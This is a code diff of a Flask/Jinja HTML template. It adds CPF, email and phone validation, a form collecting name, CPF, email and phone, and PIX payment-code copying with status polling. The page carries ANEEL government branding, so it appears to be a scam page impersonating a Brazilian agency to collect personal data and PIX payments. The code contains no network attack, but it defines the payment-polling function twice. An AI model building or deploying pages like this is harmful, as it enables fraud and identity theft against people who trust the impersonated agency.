@@ -20,6 +20,26 @@
             -webkit-font-smoothing: antialiased;
             -moz-osx-font-smoothing: grayscale;
         }
+        .step-number {
+            background-color: #003399;
+            color: white;
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+            margin-right: 12px;
+        }
+        .error-message {
+            color: #dc2626;
+            font-size: 0.875rem;
+            margin-top: 0.25rem;
+        }
+        .input-error {
+            border-color: #dc2626;
+        }
     </style>
     <script>
         tailwind.config = {
@@ -31,6 +51,91 @@
                 }
             }
         }
+
+        // Validation functions
+        function validateCPF(cpf) {
+            cpf = cpf.replace(/[^\d]/g, '');
+            if (cpf.length !== 11) return false;
+
+            let sum = 0;
+            for (let i = 0; i < 9; i++) {
+                sum += parseInt(cpf.charAt(i)) * (10 - i);
+            }
+            let remainder = (sum * 10) % 11;
+            if (remainder === 10 || remainder === 11) remainder = 0;
+            if (remainder !== parseInt(cpf.charAt(9))) return false;
+
+            sum = 0;
+            for (let i = 0; i < 10; i++) {
+                sum += parseInt(cpf.charAt(i)) * (11 - i);
+            }
+            remainder = (sum * 10) % 11;
+            if (remainder === 10 || remainder === 11) remainder = 0;
+            if (remainder !== parseInt(cpf.charAt(10))) return false;
+
+            return true;
+        }
+
+        function validateEmail(email) {
+            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return re.test(email);
+        }
+
+        function validatePhone(phone) {
+            const cleaned = phone.replace(/\D/g, '');
+            return cleaned.length >= 10 && cleaned.length <= 11;
+        }
+
+        function formatCurrency(value) {
+            return new Intl.NumberFormat('pt-BR', {
+                style: 'currency',
+                currency: 'BRL'
+            }).format(value);
+        }
+
+        function copyPixCode() {
+            const pixCode = document.getElementById('pixCode');
+            pixCode.select();
+            document.execCommand('copy');
+
+            // Visual feedback
+            const copyButton = pixCode.nextElementSibling;
+            const originalIcon = copyButton.querySelector('i');
+            const originalText = copyButton.querySelector('span').textContent;
+
+            originalIcon.classList.remove('fa-copy');
+            originalIcon.classList.add('fa-check');
+            copyButton.querySelector('span').textContent = 'Código Copiado!';
+
+            setTimeout(() => {
+                originalIcon.classList.remove('fa-check');
+                originalIcon.classList.add('fa-copy');
+                copyButton.querySelector('span').textContent = originalText;
+            }, 2000);
+        }
+
+        async function checkPaymentStatus() {
+            try {
+                const response = await fetch('/check_payment/{{ pix_data.id }}');
+                const data = await response.json();
+
+                if (data.status === 'completed') {
+                    window.location.href = '/obrigado';
+                    return;
+                }
+
+                // Continue checking every 5 seconds if still pending
+                setTimeout(checkPaymentStatus, 5000);
+            } catch (error) {
+                console.error('Erro ao verificar status:', error);
+                setTimeout(checkPaymentStatus, 5000);
+            }
+        }
+
+        // Start checking payment status if we have a payment
+        {% if pix_data and pix_data.id %}
+            checkPaymentStatus();
+        {% endif %}
     </script>
 </head>
 <body class="bg-gray-50 min-h-screen flex flex-col">
@@ -141,6 +246,55 @@
         </div>
     </div>
 
+    <!-- Payment Form (when no PIX data yet) -->
+    {% if not pix_data %}
+    <div class="container mx-auto px-4 py-8">
+        <div class="max-w-md mx-auto">
+            <form id="paymentForm" action="{{ url_for('criar_pagamento') }}" method="POST" class="bg-white rounded-lg shadow-md p-6">
+                <div class="space-y-4">
+                    <div>
+                        <label for="nome" class="block text-sm font-medium text-gray-700">Nome Completo</label>
+                        <input type="text" id="nome" name="nome" required
+                               class="mt-1 block w-full rounded-md border-gray-300 shadow-sm focus:border-gov-blue focus:ring-gov-blue sm:text-sm"
+                               onblur="this.checkValidity()" />
+                        <span class="error-message hidden">Nome é obrigatório</span>
+                    </div>
+
+                    <div>
+                        <label for="cpf" class="block text-sm font-medium text-gray-700">CPF</label>
+                        <input type="text" id="cpf" name="cpf" required
+                               pattern="\d{3}\.?\d{3}\.?\d{3}-?\d{2}"
+                               class="mt-1 block w-full rounded-md border-gray-300 shadow-sm focus:border-gov-blue focus:ring-gov-blue sm:text-sm"
+                               onblur="validateCPF(this.value) ? this.classList.remove('input-error') : this.classList.add('input-error')" />
+                        <span class="error-message hidden">CPF inválido</span>
+                    </div>
+
+                    <div>
+                        <label for="email" class="block text-sm font-medium text-gray-700">E-mail</label>
+                        <input type="email" id="email" name="email" required
+                               class="mt-1 block w-full rounded-md border-gray-300 shadow-sm focus:border-gov-blue focus:ring-gov-blue sm:text-sm"
+                               onblur="validateEmail(this.value) ? this.classList.remove('input-error') : this.classList.add('input-error')" />
+                        <span class="error-message hidden">E-mail inválido</span>
+                    </div>
+
+                    <div>
+                        <label for="telefone" class="block text-sm font-medium text-gray-700">Telefone</label>
+                        <input type="tel" id="telefone" name="telefone" required
+                               class="mt-1 block w-full rounded-md border-gray-300 shadow-sm focus:border-gov-blue focus:ring-gov-blue sm:text-sm"
+                               onblur="validatePhone(this.value) ? this.classList.remove('input-error') : this.classList.add('input-error')" />
+                        <span class="error-message hidden">Telefone inválido</span>
+                    </div>
+
+                    <button type="submit" 
+                            class="w-full bg-gov-blue text-white px-4 py-2 rounded-md hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-gov-blue">
+                        Continuar
+                    </button>
+                </div>
+            </form>
+        </div>
+    </div>
+    {% endif %}
+
     <!-- Footer -->
     <div class="bg-gov-blue text-white text-center py-4 mt-auto shadow-inner">
         <p class="text-sm font-medium">© {{ current_year }} ANEEL - Agência Nacional de Energia Elétrica. Todos os direitos reservados.</p>
@@ -169,7 +323,6 @@
             }, 2000);
         }
 
-        // Check payment status every second
         async function checkPaymentStatus() {
             try {
                 const response = await fetch('/check_payment/{{ pix_data.id }}');
@@ -180,16 +333,18 @@
                     return;
                 }
 
-                // Continue checking every second if still pending
-                setTimeout(checkPaymentStatus, 1000);
+                // Continue checking every 5 seconds if still pending
+                setTimeout(checkPaymentStatus, 5000);
             } catch (error) {
                 console.error('Erro ao verificar status:', error);
-                setTimeout(checkPaymentStatus, 1000);
+                setTimeout(checkPaymentStatus, 5000);
             }
         }
 
-        // Start checking payment status
-        checkPaymentStatus();
+        // Start checking payment status if we have a payment
+        {% if pix_data and pix_data.id %}
+            checkPaymentStatus();
+        {% endif %}
     </script>
 </body>
 </html>
